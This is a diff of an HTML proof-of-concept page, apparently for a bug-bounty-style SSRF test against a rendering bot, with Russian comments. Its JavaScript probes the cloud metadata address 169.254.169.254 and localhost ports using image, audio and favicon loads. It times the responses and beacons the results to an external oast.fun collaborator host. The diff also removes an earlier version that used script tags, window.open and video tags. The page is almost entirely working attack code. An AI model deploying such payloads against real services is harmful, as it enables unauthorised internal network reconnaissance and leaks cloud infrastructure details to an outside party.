@@ -1,39 +1,44 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PoC Full SSRF Evidence</title>
+</head>
 <body>
     <script>
         const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
 
-        function log(msg) {
-            new Image().src = oast + "/" + msg + "?r=" + Math.random();
+        function probe(url, label) {
+            const start = performance.now();
+            const img = new Image();
+            
+            img.onload = function() {
+                const duration = Math.round(performance.now() - start);
+                new Image().src = `${oast}/ALIVE_${label}?time=${duration}ms`;
+            };
+            
+            img.onerror = function() {
+                const duration = Math.round(performance.now() - start);
+                // Если ошибка прилетела слишком быстро — порта нет. 
+                // Если долго — порт открыт, но это не картинка.
+                new Image().src = `${oast}/ERROR_${label}?time=${duration}ms`;
+            };
+
+            img.src = url;
         }
 
-        // 1. Пытаемся загрузить внутренний ресурс как скрипт.
-        // Если он загрузится, будет ошибка синтаксиса, но мы узнаем, что он доступен!
-        function tryAsScript(url, label) {
-            var s = document.createElement('script');
-            s.src = url;
-            s.onload = () => log("SUCCESS_LOAD_" + label);
-            s.onerror = () => log("TRIGGERED_ERROR_" + label); // Это сработает, если ресурс ответил!
-            document.body.appendChild(s);
-        }
-
-        // 2. Метод через Window.open (иногда боты позволяют это)
-        try {
-            var win = window.open("http://169.254.169.254/latest/meta-data/", "_blank");
-            log("WINDOW_OPEN_ATTEMPT");
-        } catch(e) { log("WINDOW_OPEN_BLOCKED"); }
-
-        // Пробуем основные точки
-        tryAsScript("http://169.254.169.254/latest/meta-data/", "AZURE_AWS_META");
-        tryAsScript("http://127.0.0.1:80/", "LOCAL_SERVER");
+        // 1. Проверка реальных внутренних эндпоинтов
+        probe("http://127.0.0.1:80/favicon.ico", "LOCAL_HTTP");
+        probe("http://169.254.169.254/latest/meta-data/", "CLOUD_METADATA");
         
-        // 3. Супер-хак: если мы не можем прочитать текст, мы проверим длину ответа через Video/Audio теги
-        var v = document.createElement('video');
-        v.src = "http://169.254.169.254/latest/meta-data/";
-        v.onloadedmetadata = () => log("METADATA_SIZE_LEAK"); 
-        document.body.appendChild(v);
+        // 2. Проверка порта, которого ТОЧНО НЕТ (для сравнения времени)
+        probe("http://127.0.0.1:54321/nonexistent", "NON_EXISTENT_PORT");
 
+        // 3. Попытка вытянуть длину контента через audio (иногда работает там, где картинки нет)
+        const aud = document.createElement('audio');
+        aud.onloadedmetadata = () => new Image().src = `${oast}/AUDIO_SIZE_LEAK`;
+        aud.src = "http://169.254.169.254/latest/meta-data/";
     </script>
+
+    <link rel="icon" href="http://127.0.0.1:80/force_ping">
 </body>
 </html>
